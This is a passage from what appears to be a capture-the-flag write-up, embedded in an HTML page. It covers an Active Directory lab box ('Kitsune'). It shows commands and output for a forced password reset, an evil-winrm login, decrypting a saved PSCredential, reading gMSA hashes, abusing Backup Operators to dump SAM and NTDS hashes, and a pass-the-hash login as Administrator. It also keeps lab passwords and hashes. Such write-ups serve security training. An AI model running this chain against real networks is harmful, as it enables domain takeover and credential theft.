+dnsZoneScopeContainer: CREATE_CHILD
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+resetting the password of `schlop`
+```bash
+[manthan@manthanbhatt Kitsune]$ bloodyad -d kitsune.local -u ranch --host DC01.kitsune.local -k set password 'schlop' 'mypass123!'
+[+] Password changed successfully!
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb DC01.kitsune.local -u schlop -p 'mypass123!' --shares
+SMB         10.1.79.35      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         10.1.79.35      445    DC01             [+] kitsune.local\schlop:mypass123! 
+SMB         10.1.79.35      445    DC01             [*] Enumerated shares
+SMB         10.1.79.35      445    DC01             Share           Permissions            Remark
+SMB         10.1.79.35      445    DC01             -----           -----------            ------
+SMB         10.1.79.35      445    DC01             ADMIN$                                 Remote Admin
+SMB         10.1.79.35      445    DC01             C$                                     Default share
+SMB         10.1.79.35      445    DC01             Files           READ,WRITE             Global file share
+SMB         10.1.79.35      445    DC01             IPC$            READ                   Remote IPC
+SMB         10.1.79.35      445    DC01             NETLOGON        READ                   Logon server share 
+SMB         10.1.79.35      445    DC01             SYSVOL          READ                   Logon server share 
+```
+
+log in using evil-winrm
+```bash
+[manthan@manthanbhatt Kitsune]$ evil-winrm -i 10.1.79.35 -u schlop -p 'mypass123!'
+```
+![](img/04-winrm-schlop-networkauth-cred.png)
+
+![](img/05-winrm-schlop-user-flag.png)
+
+Submit the user flag
+```bash
+cat user.txt
+```
+
+Note: `Redact` sensitive/leaky stuff from the final writeup
+```bash
+[manthan@manthanbhatt Kitsune]$ cat networkAuth.cred 
+��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">pebble</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000015eb4da53276741952d904a69c440310000000002000000000010660000000100002000000041903d6d7ae4fa86dd56bfe8741f4a15c9e2226d386f88f6aec7f15a5779f3e6000000000e8000000002000020000000b3604d46abd67313eb9a551d3b289c48c922bada4680807c9b7556e0633f19b920000000ae67f87d8559a61c20268cde4649e3538e0c15a7e7153c33e2fc6f7b13c713a44000000064462a2ea8ee6b2bccf09125fa86779431d4ccea0c9a30f2a325239c4199e26982ae745497a01016f90238173a2eb540b47410a39f97e8cb89c8d3ca14bcc8d7</SS>
+    </Props>
+  </Obj>
+</Objs>[manthan@manthanbhatt Kitsune]$ 
+```
+
+```
+username: pebble
+password: PebbleIs47!
+```
+
+```bash
+*Evil-WinRM* PS C:\Users\schlop\Documents> $cred = Import-Clixml "C:\Users\schlop\Documents\networkAuth.cred"
+*Evil-WinRM* PS C:\Users\schlop\Documents> $cred.GetNetworkCredential().Password
+```
+![](img/06-import-clixml-pebble-password.png)
+
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb DC01.kitsune.local -u pebble -p 'PebbleIs47!' --shares
+SMB         10.1.79.35      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         10.1.79.35      445    DC01             [+] kitsune.local\pebble:PebbleIs47! 
+SMB         10.1.79.35      445    DC01             [*] Enumerated shares
+SMB         10.1.79.35      445    DC01             Share           Permissions            Remark
+SMB         10.1.79.35      445    DC01             -----           -----------            ------
+SMB         10.1.79.35      445    DC01             ADMIN$                                 Remote Admin
+SMB         10.1.79.35      445    DC01             C$                                     Default share
+SMB         10.1.79.35      445    DC01             Files           READ,WRITE             Global file share
+SMB         10.1.79.35      445    DC01             IPC$            READ                   Remote IPC
+SMB         10.1.79.35      445    DC01             NETLOGON        READ                   Logon server share 
+SMB         10.1.79.35      445    DC01             SYSVOL          READ                   Logon server share 
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ evil-winrm -i 10.1.79.35 -u 'pebble' -p 'PebbleIs47!'
+                                        
+Evil-WinRM shell v4.1
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Error: Cannot establish connection to remote endpoint. Check credentials and network.
+                                        
+Error: WinRM::WinRMAuthorizationError: WinRM::WinRMAuthorizationError
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc ldap 10.1.79.35 -u 'pebble' -p 'PebbleIs47!' --gmsa
+LDAP        10.1.79.35      389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:kitsune.local) (signing:Enforced) (channel binding:Never) 
+LDAP        10.1.79.35      389    DC01             [+] kitsune.local\pebble:PebbleIs47! 
+LDAP        10.1.79.35      389    DC01             [*] Getting GMSA Passwords
+LDAP        10.1.79.35      389    DC01             Account: svc_gmsa$            NTLM: b8696283f6628ac0ccee1434a519ba06     PrincipalsAllowedToReadPassword: IT
+LDAP        10.1.79.35      389    DC01             Account: svc_gmsa$            aes128-cts-hmac-sha1-96: 1f47614205171838c62e26c9392d63da
+LDAP        10.1.79.35      389    DC01             Account: svc_gmsa$            aes256-cts-hmac-sha1-96: 2a08d7cafe01f198a086f279d2987c0202cd6f10be1de6d3a70027b1d2d871ca
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+![](img/07-bloodhound-gmsa-backup-operators.png)
+
+```bash
+[manthan@manthanbhatt Kitsune]$ nxc smb 10.1.79.35 -u 'svc_gmsa$' -H 'b8696283f6628ac0ccee1434a519ba06' -M backup_operator 
+SMB         10.1.79.35      445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:kitsune.local) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
+SMB         10.1.79.35      445    DC01             [+] kitsune.local\svc_gmsa$:b8696283f6628ac0ccee1434a519ba06 
+BACKUP_O... 10.1.79.35      445    DC01             [*] Triggering RemoteRegistry to start through named pipe...
+BACKUP_O... 10.1.79.35      445    DC01             Saved HKLM\SAM to \\10.1.79.35\SYSVOL\SAM_NHDCOagZ
+BACKUP_O... 10.1.79.35      445    DC01             Saved HKLM\SECURITY to \\10.1.79.35\SYSVOL\SECURITY_NHDCOagZ
+BACKUP_O... 10.1.79.35      445    DC01             [*] Attempting to retrieve boot key live from the remote registry...
+BACKUP_O... 10.1.79.35      445    DC01             Boot key retrieved live -- skipping SYSTEM hive save/download.
+SMB         10.1.79.35      445    DC01             [*] Copying 'SAM_NHDCOagZ' to '/home/manthan/.nxc/logs/DC01_10.1.79.35_2026-11-13_183953.SAM'
+SMB         10.1.79.35      445    DC01             [+] File 'SAM_NHDCOagZ' was downloaded to '/home/manthan/.nxc/logs/DC01_10.1.79.35_2026-11-13_183953.SAM'
+SMB         10.1.79.35      445    DC01             [*] Copying 'SECURITY_NHDCOagZ' to '/home/manthan/.nxc/logs/DC01_10.1.79.35_2026-11-13_183953.SECURITY'
+SMB         10.1.79.35      445    DC01             [+] File 'SECURITY_NHDCOagZ' was downloaded to '/home/manthan/.nxc/logs/DC01_10.1.79.35_2026-11-13_183953.SECURITY'
+BACKUP_O... 10.1.79.35      445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dffec5d0dda0cbc8bf571471641e001:::
+BACKUP_O... 10.1.79.35      445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+BACKUP_O... 10.1.79.35      445    DC01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+BACKUP_O... 10.1.79.35      445    DC01             KITSUNE\DC01$:aes256-cts-hmac-sha1-96:54fa75afbd2c8ebc0a7c66d12d6658135ff7cccd6308c6f252d5650ecf3d6142
+BACKUP_O... 10.1.79.35      445    DC01             KITSUNE\DC01$:aes128-cts-hmac-sha1-96:98aee140894c50fc6b9df1f8f45c6bc0
+BACKUP_O... 10.1.79.35      445    DC01             KITSUNE\DC01$:des-cbc-md5:7054e68cadc1e951
+BACKUP_O... 10.1.79.35      445    DC01             KITSUNE\DC01$:plain_password_hex:dec5c211d4babd91e437304c43c778d6de456ecc929c4814883425cf929e33d9eb7d6d0147c801d263a5467ccf340b2b03dcb1c83a5bad6c7ee81391acf12a9c9b4159c736d32c68e301f35a66536423d3ae3416bbde25d75d79755a63c0b4513ebcae2988d8184eb9ab4927901ec4b09e2f1bb861f06474556cff298c08e4be1d38a0b5862d90920def2e5fc1c664adad34b4f2a31f5139cdba68129fe89b70dde6aac1f3e1f818fe6b8ebc70604c27354432e8e7e7970e3f463d0f92919d58ebbd328d52a9edc1eee7cbcec9a18f0cbb718ec6a273a568c76b630a84a820a8a3f467da2f6e4a31021b03b58ccbb021
+BACKUP_O... 10.1.79.35      445    DC01             KITSUNE\DC01$:aad3b435b51404eeaad3b435b51404ee:051ab8df98778de210183fd864020f45:::
+BACKUP_O... 10.1.79.35      445    DC01             dpapi_machinekey:0x2d3f243818d41c56a5d560c6f9e8e8e91c63cc7e
+dpapi_userkey:0xdbc4e9db99118d5c9bbfa64d0ca5c065bfa814b5
+BACKUP_O... 10.1.79.35      445    DC01             NL$KM:d6f91ebe2095216a88221f5c92ce2c8abbcf2c385953a43aefa003daeaa5a8cf0e6f9192023e5b4540e2c7a8d5da8b116d776b5f3f7848120fbfa8ce06c2c67c
+SMB         10.1.79.35      445    DC01             [+] kitsune.local\DC01$:051ab8df98778de210183fd864020f45 
+BACKUP_O... 10.1.79.35      445    DC01             [*] Dumping NTDS using DC01$...
+SMB         10.1.79.35      445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+SMB         10.1.79.35      445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         10.1.79.35      445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:2dffec5d0dda0cbc8bf571471641e001:::
+SMB         10.1.79.35      445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.1.79.35      445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d1c9d31dc9ece5e96fc344c85782ba93:::
+SMB         10.1.79.35      445    DC01             kitsune.local\ranch:1103:aad3b435b51404eeaad3b435b51404ee:47d29308446189faa2acec65586963c1:::
+SMB         10.1.79.35      445    DC01             kitsune.local\schlop:1105:aad3b435b51404eeaad3b435b51404ee:574d768b96c9ebb2d712a5b85674810b:::
+SMB         10.1.79.35      445    DC01             kitsune.local\pebble:1106:aad3b435b51404eeaad3b435b51404ee:b83abecf382a399ee1885f72a596d2d3:::
+SMB         10.1.79.35      445    DC01             kitsune.local\ross:1107:aad3b435b51404eeaad3b435b51404ee:3f48c34a06f664d675b41282e7606ed7:::
+SMB         10.1.79.35      445    DC01             kitsune.local\protagonist:1108:aad3b435b51404eeaad3b435b51404ee:3f48c34a06f664d675b41282e7606ed7:::
+SMB         10.1.79.35      445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:051ab8df98778de210183fd864020f45:::
+SMB         10.1.79.35      445    DC01             svc_gmsa$:1602:aad3b435b51404eeaad3b435b51404ee:b8696283f6628ac0ccee1434a519ba06:::
+SMB         10.1.79.35      445    DC01             [+] Dumped 10 NTDS hashes to /home/manthan/.nxc/logs/ntds/DC01_10.1.79.35_2026-11-13_183953.ntds of which 8 were added to the database
+SMB         10.1.79.35      445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         10.1.79.35      445    DC01             [*] grep -iv disabled /home/manthan/.nxc/logs/ntds/DC01_10.1.79.35_2026-11-13_183953.ntds | cut -d ':' -f1
+BACKUP_O... 10.1.79.35      445    DC01             [*] Using Administrator to clean up files...
+SMB         10.1.79.35      445    DC01             [+] kitsune.local\Administrator:2dffec5d0dda0cbc8bf571471641e001 (Pwn3d!)
+BACKUP_O... 10.1.79.35      445    DC01             [*] Cleaning dump with user Administrator on domain kitsune.local
+BACKUP_O... 10.1.79.35      445    DC01             [*] Successfully deleted dump files !
+[manthan@manthanbhatt Kitsune]$ 
+```
+
+Got the hash of `Administrator` Account
+```
+Administrator:2dffec5d0dda0cbc8bf571471641e001
+```
+
+```bash
+[manthan@manthanbhatt Kitsune]$ evil-winrm -i 10.1.79.35 -u 'Administrator' -H '2dffec5d0dda0cbc8bf571471641e001'
+```
+![](img/08-administrator-root-flag-redacted.png)
+# Flags
+- User: `HSM{REDACTED}`
+- Root: HSM{REDACTED}
+
+# Post-exploitation / privesc
+<!-- what you tried, what worked, what the escalation path actually was -->
+
+# Lessons / root cause
+<!-- optional while you're working the box — the skill can usually infer this
+     from the exploitation steps, but jot it down if something's non-obvious -->
+``</script>
+<script src="https://cdn.jsdelivr.net/npm/marked@12.0.2/marked.min.js"></script>
+<script>document.getElementById("out").innerHTML=marked.parse(document.getElementById("md").textContent);</script>
+</body></html>
